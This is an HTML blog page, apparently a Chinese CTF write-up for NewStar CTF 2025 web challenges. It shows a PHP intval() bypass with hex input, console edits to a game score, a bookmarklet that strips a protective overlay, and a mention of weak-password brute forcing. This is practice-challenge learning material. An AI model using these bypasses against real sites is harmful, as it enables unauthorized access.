@@ -1,0 +1,1460 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="学习,生活">
+    
+    <meta name="author" content="xhxbb">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set data attribute for CSS variables
+                root.setAttribute("data-theme", theme);
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes once DOM is ready
+            if (document.readyState !== "loading") {
+                document.body.classList.add(theme + "-mode");
+            } else {
+                document.addEventListener("DOMContentLoaded", () => {
+                    document.body.classList.add(theme + "-mode");
+                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
+                });
+            }
+        })();
+    </script>
+    
+    <!-- Critical CSS to prevent flash -->
+    <style>
+        :root[data-theme="dark"] {
+            --background-color: #202124;
+            --background-color-transparent: rgba(32, 33, 36, 0.6);
+            --second-background-color: #2d2e32;
+            --third-background-color: #34353a;
+            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #ffffff;
+            --second-text-color: #eeeeee;
+            --third-text-color: #bebec6;
+            --fourth-text-color: #999999;
+            --default-text-color: #bebec6;
+            --invert-text-color: #373D3F;
+            --border-color: rgba(255, 255, 255, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(255, 255, 255, 0.08);
+            --shadow-color-2: rgba(255, 255, 255, 0.05);
+        }
+        
+        :root[data-theme="light"] {
+            --background-color: #fff;
+            --background-color-transparent: rgba(255, 255, 255, 0.6);
+            --second-background-color: #f8f8f8;
+            --third-background-color: #f2f2f2;
+            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #16171a;
+            --second-text-color: #2f3037;
+            --third-text-color: #5e5e5e;
+            --fourth-text-color: #eeeeee;
+            --default-text-color: #373D3F;
+            --invert-text-color: #bebec6;
+            --border-color: rgba(0, 0, 0, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(0, 0, 0, 0.08);
+            --shadow-color-2: rgba(0, 0, 0, 0.05);
+        }
+        
+        body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+        
+        /* Apply body classes as soon as DOM is ready */
+        :root[data-theme="dark"] body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+    </style>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://xhxbb1.github.io/2025/12/03/newstar-ctf-2025复现/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+        
+        <meta name="description" content="学习记录，生活记录">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NewStar CTF 2025复现">
+<meta property="og:url" content="https://xhxbb1.github.io/2025/12/03/NewStar-CTF-2025%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="xhxbb blog">
+<meta property="og:description" content="学习记录，生活记录">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://xhxbb1.github.io/images/redefine-og.webp">
+<meta property="article:published_time" content="2025-12-03T11:50:43.000Z">
+<meta property="article:modified_time" content="2025-12-03T13:37:39.783Z">
+<meta property="article:author" content="xhxbb">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://xhxbb1.github.io/images/redefine-og.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/myIcon.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/myIcon.png">
+    <meta name="theme-color" content="#ff80ab">
+    <link rel="shortcut icon" href="/images/myIcon.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            NewStar CTF 2025复现 | xhxbb的博客
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+        <link href="" rel="stylesheet">
+    
+    
+        <link href="" rel="stylesheet">
+    
+    
+        <link href="" rel="stylesheet">
+    
+    
+        
+<script src="/js/build/libs/anime.min.js"></script>
+
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"xhxbb1.github.io","root":"/","language":"zh-CN","path":"search.json"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#ff80ab","secondary":"#fce4ec","default_mode":"light"},"global":{"fonts":{"chinese":{"enable":true,"family":null,"url":null},"english":{"enable":true,"family":null,"url":null},"title":{"enable":true,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":true},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":true,"custom_message":"Welcome To xhxbb's Blog :)"},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"学习记录，生活记录"},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/shu.png","dark":"/images/shu.png"},"title":"欢迎来到xhxbb的博客","subtitle":{"text":["你好你好你好你好你好你好你好:)"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"center","links":{"github":"https://github.com/xhxbb1","instagram":null,"zhihu":null,"twitter":null,"email":"xhx15800520768@outlook.com","bilibili":"https://space.bilibili.com/302129703?spm_id_from=333.1007.0.0"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":true,"type":"fixed","audios":[{"name":"浸春芜","artist":"塞壬唱片-MSR/宋柏/十音/解伟芩","url":"images/bgMusic.mp3","cover":"images/jinchunwu.webp","lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":true,"color":{"left":"#f78736","right":"#367df7","transparency":30},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"icon":"fa-regular fa-tags","path":"/tags/"},"Categories":{"icon":"fa-regular fa-folder","path":"/categories/"},"Friends":{"icon":"fa-solid fa-link","path":"/links/"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":3,"tags_style":"cloud"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"info","announcement":null,"show_on_mobile":true,"links":{"Tags":{"path":"/tags/","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories/","icon":"fa-regular fa-folder"},"Archives":{"path":"/archives/","icon":"fa-regular fa-archive"}}},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":5},"tags":{"enable":true,"limit":5}},"footerStart":"2025/7/23 12:02:00"};
+    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    <h2 class="ml13">
+        Welcome To xhxbb&#39;s Blog :)
+    </h2>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+        var animation = anime.timeline({ loop: true })
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [20, 0],
+                translateZ: 0,
+                opacity: [0, 1],
+                filter: ['blur(5px)', 'blur(0px)'],
+                easing: "easeOutExpo",
+                duration: 1200,
+                delay: (el, i) => 300 + 20 * i,
+            })
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [0, -20],
+                opacity: [1, 0],
+                filter: ['blur(0px)', 'blur(5px)'],
+                easing: "easeInExpo",
+                duration: 1000,
+                delay: (el, i) => 15 * i,
+                complete: function() {
+                    hidePreloader();
+                }
+            }, '-=700');
+
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            setTimeout(hidePreloader, 5000); // Call hidePreloader after 5000 milliseconds if not already called by animation
+        });
+
+        function hidePreloader() {
+            var preloader = document.querySelector('.preloader');
+            preloader.style.opacity = '0';
+            setTimeout(function () {
+                preloader.style.display = 'none';
+            }, 200);
+        }
+    </script>
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                xhxbb的博客
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    首页
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    归档
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/tags/"
+                                        >
+                                    <i class="fa-regular fa-tags fa-fw"></i>
+                                    标签
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/categories/"
+                                        >
+                                    <i class="fa-regular fa-folder fa-fw"></i>
+                                    分类
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/links/"
+                                        >
+                                    <i class="fa-solid fa-link fa-fw"></i>
+                                    友情链接
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                首页
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                归档
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/tags/"
+                        >
+                            <span>
+                                标签
+                            </span>
+                            
+                                <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/categories/"
+                        >
+                            <span>
+                                分类
+                            </span>
+                            
+                                <i class="fa-regular fa-folder fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/links/"
+                        >
+                            <span>
+                                友情链接
+                            </span>
+                            
+                                <i class="fa-solid fa-link fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+                
+                    
+                    
+                    
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">5</div>
+        <div class="label text-third-text-color text-sm">标签</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">3</div>
+        <div class="label text-third-text-color text-sm">分类</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">6</div>
+        <div class="label text-third-text-color text-sm">文章</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">NewStar CTF 2025复现</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/photo.jpg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">xhxbb</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv1</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-12-03 19:50:43</span>
+        <span class="mobile">2025-12-03 19:50:43</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-12-03 21:37:39</span>
+            <span class="mobile">2025-12-03 21:37:39</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/CTF/">CTF</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<blockquote>
+<p>啊啊啊啊啊啊啊好菜好菜好菜，复现复现复现T_T</p>
+</blockquote>
+<h1 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h1><h2 id="multi-headach3"><a href="#multi-headach3" class="headerlink" title="multi-headach3"></a>multi-headach3</h2><p>访问&#x2F;robots.txt，接着访问&#x2F;hidden.php，但是重定向了，查看相应头，得到flag。<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../../note/ctfwp/newstar2025_web/multi-headach3.png"
+                     
+                ></p>
+<hr>
+<h2 id="宇宙的中心是php"><a href="#宇宙的中心是php" class="headerlink" title="宇宙的中心是php"></a>宇宙的中心是php</h2><p>抓个包发现路径&#x2F;s3kret.php</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;newstar2025&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$answer</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;newstar2025&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$answer</span>)!=<span class="number">47</span>&amp;&amp;<span class="title function_ invoke__">intval</span>(<span class="variable">$answer</span>,<span class="number">0</span>)==<span class="number">47</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;你还未参透奥秘&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>intval() 是 PHP 中用于获取变量整数值的函数，它可以将各种类型的值转换为整数。(将不同进制转换为十进制整数)。intval($answer,0)，当 intval() 的第二个参数设置为 <code>0</code> 时，函数会根据字符串的格式自动检测进制。</p>
+</blockquote>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$tests</span> = [<span class="string">&#x27;47&#x27;</span>, <span class="string">&#x27;047&#x27;</span>, <span class="string">&#x27;0x2f&#x27;</span>, <span class="string">&#x27;0X2F&#x27;</span>, <span class="string">&#x27;0b101111&#x27;</span>];</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$tests</span> <span class="keyword">as</span> <span class="variable">$t</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$t</span>,<span class="string">&quot; =&gt; intval=&quot;</span>,</span><br><span class="line">    <span class="title function_ invoke__">intval</span>(<span class="variable">$t</span>),</span><br><span class="line">    <span class="string">&quot;  intval(,0)=&quot;</span>,</span><br><span class="line">    <span class="title function_ invoke__">intval</span>(<span class="variable">$t</span>,<span class="number">0</span>),</span><br><span class="line">    PHP_EOL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>0x2f满足条件</p>
+<p>hackbar提交即可获得flag。</p>
+<h2 id="别笑你也过不了第二关"><a href="#别笑你也过不了第二关" class="headerlink" title="别笑你也过不了第二关"></a>别笑你也过不了第二关</h2><div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">score = <span class="number">1000000</span>;</span><br><span class="line">currentLevel = <span class="number">1</span>;</span><br><span class="line"><span class="title function_">endLevel</span>();</span><br><span class="line"><span class="comment">//控制台中输入</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="我真得控制你了"><a href="#我真得控制你了" class="headerlink" title="我真得控制你了"></a>我真得控制你了</h2><p>抓包后让ai来审计前端代码，有保护层，书签绕过</p>
+<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">javascript</span>:(<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;shieldOverlay&#x27;</span>)?.<span class="title function_">remove</span>();<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(%27accessButton%<span class="number">27</span>).<span class="property">disabled</span>=<span class="literal">false</span>;<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(%27accessButton%<span class="number">27</span>).<span class="property">classList</span>.<span class="title function_">add</span>(%27active%<span class="number">27</span>);&#125;)()</span><br></pre></td></tr></table></figure></div>
+
+<p>ai解析：</p>
+<ol>
+<li><strong>javascript: 协议</strong></li>
+</ol>
+<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">javascript</span>:代码内容</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>这是浏览器支持的特殊协议</li>
+<li>允许在地址栏或书签中直接执行JavaScript代码</li>
+<li>相当于在当前页面注入并执行脚本</li>
+</ul>
+<ol start="2">
+<li><strong>立即执行函数</strong></li>
+</ol>
+<p>javascript</p>
+<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params"></span>)&#123; ... &#125;)()</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>创建一个匿名函数并立即执行</li>
+<li>避免污染全局作用域</li>
+</ul>
+<ol start="3">
+<li><strong>移除保护层</strong></li>
+</ol>
+<p>javascript</p>
+<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;shieldOverlay&#x27;</span>)?.<span class="title function_">remove</span>();</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><code>?.</code> 是可选链操作符，如果元素存在才执行remove()</li>
+<li>直接删除遮挡的DOM元素</li>
+</ul>
+<ol start="4">
+<li><strong>启用按钮</strong></li>
+</ol>
+<p>javascript</p>
+<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;accessButton&#x27;</span>).<span class="property">disabled</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;accessButton&#x27;</span>).<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;active&#x27;</span>);</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>移除按钮的禁用状态</li>
+<li>添加激活样式类</li>
+</ul>
+<p>接着，下一关弱口令爆破即可，获得密码。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../../note/ctfwp/newstar2025_web/%E6%88%91%E7%9C%9F%E5%BE%97%E6%8E%A7%E5%88%B6%E4%BD%A0%E4%BA%86_%E5%BC%B1%E5%8F%A3%E4%BB%A4.png"
+                     
+                ></p>
